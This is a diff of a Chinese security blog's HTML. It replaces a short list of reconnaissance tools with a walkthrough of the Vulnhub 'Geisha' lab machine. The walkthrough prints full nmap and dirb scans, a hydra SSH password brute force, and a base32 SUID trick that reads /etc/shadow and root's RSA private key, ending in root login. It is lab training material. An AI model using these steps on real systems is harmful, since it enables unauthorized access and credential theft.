@@ -4,33 +4,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="信息收集, Web h**k Python aling">
+    <meta name="keywords" content="Geisha, Web h**k Python aling">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="参考链接
+    <meta name="description" content="
+  nmap 扫描
 
-  子域名收集
-
-dnsdumpster 
-virutotal 
-
-  waf 识别
-
-【工具】wafw00f
-
-  端口收集、C段IP
-
-【工具】nmap
-
-  旁站（IP反查）
-
-爱站
-站长之家
-
-  敏感目录
-
-【工具】D">
+kali@kali:~$ sudo nmap -sV -sS 192.168.232.155 -p1-65535 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -38,7 +20,7 @@ virutotal
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>信息收集 | 道士信佛</title>
+    <title>Geisha | 道士信佛</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -318,13 +300,13 @@ virutotal
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        信息收集
+                        Geisha
                     </div>
                 </div>
             </div>
@@ -435,8 +417,8 @@ virutotal
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/信息收集/" target="_blank">
-                            <span class="chip bg-color">信息收集</span>
+                        <a href="/tags/vulnhub/" target="_blank">
+                            <span class="chip bg-color">vulnhub</span>
                         </a>
                         
                     </div>
@@ -459,7 +441,7 @@ virutotal
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-20
+                    2020-06-13
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -473,14 +455,14 @@ virutotal
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    205
+                    931
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
                 
@@ -491,64 +473,131 @@ virutotal
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong><em><a href="https://www.freebuf.com/articles/web/215182.html" target="_blank" rel="noopener">参考链接</a></em></strong></p>
-<blockquote>
-<p>  <strong>子域名收集</strong></p>
+                <blockquote>
+<p>  nmap 扫描</p>
 </blockquote>
-<p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster</a> </p>
-<p><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">virutotal</a> </p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sV -sS 192.168.232.155 -p1-65535 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 01:57 EDT
+Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 27.95% done; ETC: 01:57 (0:00:03 remaining)
+Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 71.43% done; ETC: 01:57 (0:00:04 remaining)
+Nmap scan report for bogon (192.168.232.155)
+Host is up (0.00098s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
+7080/tcp open  ssl/http LiteSpeed httpd
+7125/tcp open  http     nginx 1.17.10
+8088/tcp open  http     LiteSpeed httpd
+9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)
+MAC Address: 00:0C:29:52:CD:CD (VMware)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.33 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问一波web服务，发现都是一张图片，还挺好看</p>
+<p><img src="image-20200613133133458.png" alt></p>
 <blockquote>
-<p>  <strong>waf 识别</strong></p>
+<p>  dirb 扫描</p>
 </blockquote>
-<p>【工具】<strong>wafw00f</strong></p>
-<blockquote>
-<p>  <strong>端口收集、C段IP</strong></p>
-</blockquote>
-<p>【工具】<strong>nmap</strong></p>
-<blockquote>
-<p>  <strong>旁站（IP反查）</strong></p>
-</blockquote>
-<p><a href="http://dns.aizhan.com" target="_blank" rel="noopener">爱站</a></p>
-<p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">站长之家</a></p>
-<blockquote>
-<p>  <strong>敏感目录</strong></p>
-</blockquote>
-<p>【工具】DirBuster、dirb、御剑、google搜素</p>
-<blockquote>
-<p>  <strong>IIS 短文件名枚举</strong></p>
-</blockquote>
-<p><a href="https://www.freebuf.com/articles/web/172561.html" target="_blank" rel="noopener">参考链接</a></p>
-<blockquote>
-<p>  <strong>github信息收集(搜源码)</strong></p>
-</blockquote>
-<p><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">工具地址</a></p>
-<blockquote>
-<p>  网站技术信息探测（操作系统，中间间，脚本语言，数据库，cms）</p>
-</blockquote>
-<p><a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">云悉</a></p>
-<p>查看数据包头获取相关信息</p>
-<p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">whatweb</a></p>
-<p>【工具】<strong>kali whatweb</strong></p>
-<blockquote>
-<p>  <strong>shodan fofa 钟馗之眼</strong></p>
-</blockquote>
-<p><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></p>
-<p><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></p>
-<p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a></p>
-<blockquote>
-<p>  <strong>寻找真实 ip</strong></p>
-</blockquote>
-<p>【子域名入手】子域名可能没有用cdn、历史DNS平台：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">X</a>、<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dnsdb</a> </p>
-<p>【邮件原文】邮件原文的邮件头可能包含真实IP</p>
-<p>【https证书】<a href="https://censys.io/" target="_blank" rel="noopener">censys</a></p>
-<blockquote>
-<p>  <strong>弱点扫描</strong></p>
-</blockquote>
-<p>【工具】<strong>awvs</strong>、<strong>nessus</strong></p>
-<blockquote>
-<p>  社工 </p>
-</blockquote>
-<p>入手点：whois  、员工信息 、公司信息、云盘搜索、社工库……</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo dirb http://192.168.232.155:7125/
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+START_TIME: Sat Jun 13 02:00:37 2020
+URL_BASE: http://192.168.232.155:7125/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612                                                          
+---- Scanning URL: http://192.168.232.155:7125/ ----
++ http://192.168.232.155:7125/index.php (CODE:200|SIZE:175)                               
++ http://192.168.232.155:7125/passwd (CODE:200|SIZE:1432)                                 
++ http://192.168.232.155:7125/shadow (CODE:403|SIZE:556)                                 
+-----------------
+END_TIME: Sat Jun 13 02:00:40 2020
+DOWNLOADED: 4612 - FOUND: 3
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问 passwd 文件将其下载下来，shadow 由于权限不足无法访问</p>
+<p><img src="image-20200613140259069.png" alt></p>
+<p>有一个 geisha 用户，尝试爆破ssh</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo hydra -l geisha -P ./rockyou.txt -f ssh://192.168.232.155
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-13 02:04:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.232.155:22/
+[STATUS] 149.00 tries/min, 149 tries in 00:01h, 14344250 to do in 1604:31h, 16 active
+[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344063 to do in 2134:32h, 16 active
+[22][ssh] host: 192.168.232.155   login: geisha   password: letmein
+[STATUS] attack finished for 192.168.232.155 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-13 02:09:01
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到密码，登陆，准别提权，放 LinEnum 去跑</p>
+<p><img src="image-20200613141823581.png" alt></p>
+<p>可以利用这个程序读敏感文件，用它读 shadow</p>
+<pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:/tmp$ base32 /etc/shadow | base32 -d
+root:$6$p/n6gA9F6qb7..aD$d4YNXyKsg.Tam5AoDiOp0T9rWAMAkN55O9.BTyhyOacdXHgpTkpbE9nBe5R35oFzntg7prt3xfdSW9U9Ty1680:18391:0:99999:7:::
+……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>用 JtR 尝试破解 root 密码，解密失败</p>
+<p>恼羞成怒，直接都 root 的 flag</p>
+<pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:~$ base32 /root/flag.txt | base32 -d
+Flag{Sun_CTF_220_5_G31sha}
+geisha@geisha:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>冷静下来发现酱紫是不对滴~，还是拿 root 权限踏实</p>
+<p>读取 ssh 私钥，用 root 私钥登陆靶机，得到root权限…… </p>
+<pre class="line-numbers language-shell"><code class="language-shell">geisha@geisha:~$ base32 /root/.ssh/id_rsa | base32 -d
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
+OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
+89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
+5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
+fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
+TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
+WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
+1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
+Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
+8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
+jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
+2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
+cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
+THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
+RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
+xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
+1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
+edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
+65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
+XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
+zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
+v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
+OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
+bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
+-----END RSA PRIVATE KEY-----
+geisha@geisha:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拷贝下来 修改权限为 <code>600</code> 远程登陆</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo chmod 600 privateKey 
+kali@kali:~$ ls -lh privateKey 
+-rw------- 1 root root 1.7K Jun 12 22:43 privateKey
+kali@kali:~$ 
+kali@kali:~$ sudo ssh -i privateKey root@192.168.232.155 
+Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 12 22:49:43 2020 from 192.168.232.153
+root@geisha:~# 
+root@geisha:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@geisha:~# 
+root@geisha:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拜了个拜~</p>
 
             </div>
             <hr />
@@ -707,9 +756,9 @@ virutotal
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《信息收集》
+                    《Geisha》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/05/20/xin-xi-shou-ji/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/06/13/geisha/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ALing
             </a> 采用
@@ -1011,29 +1060,30 @@ virutotal
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/05/21/vulnhub-dc-1/">
+                <a href="/2020/06/13/geisha/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="DC-1">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Geisha">
                         
-                        <span class="card-title">DC-1</span>
+                        <span class="card-title">Geisha</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CMS漏洞拿shell、find提权
+                            端口扫描、ssh爆破、base32读shadow、密钥登陆ssh
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1046,6 +1096,7 @@ virutotal
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1064,26 +1115,33 @@ virutotal
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/19/vulnhub-mrrobot/">
+                <a href="/2020/06/11/shell-yu-fa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="MrRobot">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="shell 语法">
                         
-                        <span class="card-title">MrRobot</span>
+                        <span class="card-title">shell 语法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            目录扫描、爆破后台、wordpress拿shell，nmap提权
+                            shell学习，持续更新……
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-19
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-11
                             </span>
                         <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/编程语言/" class="post-category" target="_blank">
+                                    编程语言
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -1091,8 +1149,8 @@ virutotal
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/vulnhub/" target="_blank">
-                        <span class="chip bg-color">vulnhub</span>
+                    <a href="/tags/shell/" target="_blank">
+                        <span class="chip bg-color">shell</span>
                     </a>
                     
                 </div>
@@ -1238,6 +1296,25 @@ virutotal
     
 
 </main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 
     <footer class="page-footer bg-color">
